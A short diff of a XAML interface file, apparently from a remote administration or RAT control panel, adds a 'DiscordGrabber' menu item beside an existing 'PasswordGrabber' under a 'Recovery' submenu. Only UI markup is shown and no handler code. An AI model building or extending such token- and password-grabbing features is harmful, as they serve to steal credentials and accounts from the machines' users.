@@ -289,6 +289,7 @@
                                 <Separator/>
                                 <MenuItem Header="Recovery">
                                     <MenuItem Header="PasswordGrabber" Click="Password_Click"/>
+                                    <MenuItem Header="DiscordGrabber" Click="OpenDiscordTokenWindow_Click"/>
                                 </MenuItem> 
                                 <Separator/>
                                 <MenuItem Header="Power Options">
